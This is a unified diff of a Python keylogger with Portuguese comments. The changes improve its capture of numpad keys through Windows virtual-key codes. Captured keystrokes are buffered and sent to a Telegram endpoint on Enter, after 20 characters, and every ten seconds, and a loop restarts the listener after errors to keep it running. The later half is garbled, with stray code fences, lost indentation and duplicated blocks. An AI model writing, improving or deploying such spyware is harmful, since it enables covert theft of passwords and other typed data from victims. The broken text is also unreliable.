@@ -22,20 +22,27 @@ def send_to_telegram(text):
 def on_press(key):
     global buffer
     try:
+        # Tenta pegar o caractere normal primeiro
         buffer += key.char
     except AttributeError:
-        # Captura teclas do Teclado Numérico (Numpad)
-        if hasattr(key, 'name') and 'kp_' in str(key).lower():
-            num = str(key).replace("Key.kp_", "").replace("'", "")
-            if num == "decimal":
-                buffer += "."
-            elif num == "enter":
+        # Se cair aqui, é uma tecla especial ou teclado numérico
+        vk = getattr(key, 'vk', None)
+        
+        # Mapeamento de Virtual Keys do Windows para Numpad e Símbolos
+        numpad_map = {
+            96: '0', 97: '1', 98: '2', 99: '3', 100: '4', 
+            101: '5', 102: '6', 103: '7', 104: '8', 105: '9',
+            110: '.', 109: '*', 107: '-', 111: '/', 108: ',',
+            13: '[ENTER]' 
+        }
+
+        if vk in numpad_map:
+            val = numpad_map[vk]
+            if val == '[ENTER]':
                 send_to_telegram(buffer + " [ENTER]")
                 buffer = ""
-            elif num.isdigit():
-                buffer += num
             else:
-                buffer += f" [{num}] "
+                buffer += val
         
         # Teclas de controle normais
         elif key == Key.space:
@@ -47,10 +54,11 @@ def on_press(key):
             buffer = buffer[:-1]
         elif key == Key.tab:
             buffer += " [TAB] "
-        elif key == Key.shift or key == Key.shift_r or key == Key.ctrl or key == Key.ctrl_l or key == Key.alt or key == Key.alt_gr:
+        elif key in [Key.shift, Key.shift_r, Key.ctrl, Key.ctrl_l, Key.alt, Key.alt_gr]:
             pass 
         else:
-            buffer += f" [{key}] "
+            key_name = str(key).replace("Key.", "")
+            buffer += f" [{key_name}] "
 
     if len(buffer) >= 20:
         send_to_telegram(buffer)
@@ -61,16 +69,50 @@ def auto_send():
     while True:
         time.sleep(10) 
         if buffer:
-            send_to_telegram(buffer + " [AUTO-SEND]")
-            buffer = ""
+            send_to_telegram(buffer + " [AUTO-SEND]")```python
+buffer = ""
 
 # Inicia a thread de envio automático
 threading.Thread(target=auto_send, daemon=True).start()
 
 # Loop principal para manter o keylogger vivo
 while True:
-    try:
-        with Listener(on_press=on_press) as listener:
-            listener.join()
-    except Exception:
-        time.sleep(10)
+try:
+with Listener(on_press=on_press) as listener:
+listener.join()
+except Exception:
+time.sleep(10)
+``````python
+buffer = ""
+
+# Inicia a thread de envio automático
+
+threading.Thread(target=auto_send, daemon=True).start()
+
+# Loop principal para manter o keylogger vivo
+
+while True:
+try:
+with Listener(on_press=on_press) as listener:
+listener.join()
+except Exception:
+time.sleep(10)
+``````python
+def auto_send():
+global buffer
+while True:
+time.sleep(10)
+if buffer:
+send_to_telegram(buffer + " [AUTO-SEND]")
+buffer = ""
+
+# Inicia a thread de envio automático
+threading.Thread(target=auto_send, daemon=True).start()
+
+# Loop principal para manter o keylogger vivo
+while True:
+try:
+with Listener(on_press=on_press) as listener:
+listener.join()
+except Exception:
+time.sleep(10)
